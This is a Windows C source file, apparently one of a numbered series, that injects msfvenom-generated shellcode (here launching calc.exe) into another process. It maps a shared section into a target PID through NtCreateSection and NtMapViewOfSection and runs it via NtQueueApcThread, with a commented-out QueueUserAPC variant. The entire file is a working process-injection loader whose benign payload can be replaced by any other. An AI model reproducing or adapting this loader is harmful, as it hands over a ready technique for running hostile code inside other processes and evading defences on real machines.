#include "Windows.h"
#include "stdio.h"
#include "8-shellcode-inject-variation-header.h"


#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE )
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

/*
msfvenom -p windows/exec CMD=calc.exe -f c
length: 519 bytes
*/
unsigned char payload[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main(int argc, char* argv[])
{

	DWORD pid;
	if (argc < 3) {
		printf("[*] Command: %s PID ThreadId.\n", argv[0]);

		pid = GetCurrentProcessId();
		printf("[*] Error, no PID provided. Exiting.\n");
		return -1;
	}

	pid = atoi(argv[1]);
	printf("[*] Using PID %d provided.\n", pid);

	int payload_len = sizeof(payload);
	
	printf("[*] Attempting to get handle on process.\n");
	HANDLE  processHandle = OpenProcess(CREATE_THREAD_ACCESS, 1, pid);
	if (processHandle == 0) {
		printf("[*] Error opening process handle. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Got process handle.\n");


	printf("[*] Attempting to create new section.\n");
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	NtCreateSection NtCreateSection_func = (NtCreateSection)GetProcAddress(hModule, "NtCreateSection");
	NtMapViewOfSection NtMapViewOfSection_func = (NtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
	NtAlertResumeThread NtAlertResumeThread_func = (NtAlertResumeThread)GetProcAddress(hModule, "NtAlertResumeThread");
	NtQueueApcThread NtQueueApcThread_func = (NtQueueApcThread)GetProcAddress(hModule, "NtQueueApcThread");
	//check its not returned NULL

	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize = { 4096 };

	NTSTATUS createSection = NtCreateSection_func(
		&hSection,				//SectionHandle
		(SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE),		//DesiredAccess
		NULL,					//ObjectAttributes
		(PLARGE_INTEGER)&sectionSize,						//MaximumSize
		PAGE_EXECUTE_READWRITE,	//SectionPageProtection
		SEC_COMMIT,				//AllocationAttributes
		NULL					//FileHandle
	);
	//printf("[*] CreateSection status is %x.\n", a);
	if (!NT_SUCCESS(createSection))
	{
		printf("[*] Error: NtCreateSection_func failed with status %#x", createSection);
		return 0;
	}


	VOID * baseAddress = NULL;
	ULONG_PTR zeroBits = 0;
	SIZE_T viewSize = 0;
	

	printf("[*] Attempting to map view of new section to local process.\n");
	NTSTATUS mapView = NtMapViewOfSection_func(
		hSection,		//Section handle
		GetCurrentProcess(),	// process handle	// FFFFFFFF -> current process?
		&baseAddress,			// base address
		zeroBits,			// zero bits
		SIZE_T(4096),   //CommitSize,
		NULL,		//SectionOffset,
		&viewSize,         //ViewSize,
		ViewUnmap, //InheritDisposition,
		MEM_TOP_DOWN,           //AllocationType,
		PAGE_READWRITE       //Win32Protect
	);
	if (!NT_SUCCESS(mapView))
	{
		printf("[*] Error: NtMapViewOfSection_func failed with status %#x.\n", mapView);
		return -1;
	}

	printf("[*] Attempting to copy over payload.\n");
	RtlMoveMemory(baseAddress, payload, payload_len);
	printf("[*] Wrote bytes.\n");


	printf("[*] Attempting to map view of section to remote process.\n");


	VOID * remoteAddress = NULL;
	ULONG_PTR zeroBitsRemote = 0;
	SIZE_T viewSizeRemote = 0;

	printf("[*] Address of remote pointer is %p.\n", remoteAddress);
	NTSTATUS mapViewRemote = NtMapViewOfSection_func(
		hSection,		//Section handle
		processHandle,	// process handle
		&remoteAddress,			
		zeroBitsRemote,			// zero bits
		SIZE_T(4096),   //CommitSize,
		NULL,		//SectionOffset,
		&viewSizeRemote,         //ViewSize,
		ViewUnmap, //InheritDisposition,
		MEM_TOP_DOWN,           //AllocationType,
		PAGE_EXECUTE_READ       //Win32Protect
	);
	printf("[*] Address of remote pointer is %p.\n", remoteAddress);
	if (!NT_SUCCESS(mapViewRemote))
	{
		printf("[*] Error: NtMapViewOfSection_func on remote process failed with status %#x.\n", mapViewRemote);
		return 0;
	}


	DWORD tId = atoi(argv[2]);
	printf("[*] Attempting to open thread %d.\n", tId);
	HANDLE hThread = OpenThread(THREAD_SET_CONTEXT| THREAD_SUSPEND_RESUME, FALSE, tId);
	if (hThread == 0) {
		printf("[*] Error opening remote thread. Error: %d.\n", GetLastError());
		return -1;
	}
	
	NTSTATUS queueStatus = NtQueueApcThread_func(
		hThread,
		(PIO_APC_ROUTINE)remoteAddress,
		NULL, NULL, NULL
	);
	if (!NT_SUCCESS(queueStatus))
	{
		printf("[*] Error: NtMapViewOfSection_func on remote process failed with status %#x.\n", queueStatus);
		return 0;
	}



	/*
	printf("[*] Attempting to queue APC.\n");
	DWORD result = QueueUserAPC(
		(PAPCFUNC)remoteAddress,		//pointer to APC function
		hThread,							// thread handle
		NULL							//dwData, parameter passed to function
	);
	if (result == 0) {
		printf("[*] Error queueing APC. Error: %d.\n", GetLastError());
		return -1;
	}
	
	ULONG suspendCount = NULL;
	NTSTATUS x = NtAlertResumeThread_func(hThread, &suspendCount);
	if (!NT_SUCCESS(x))
	{
		printf("[*] Error: NtMapViewOfSection_func on remote process failed with status %#x.\n", x);
		return 0;
	}
	printf("[*] Suspend count is at %d.\n", suspendCount);

	printf("[*] Done.\n");

	*/
}
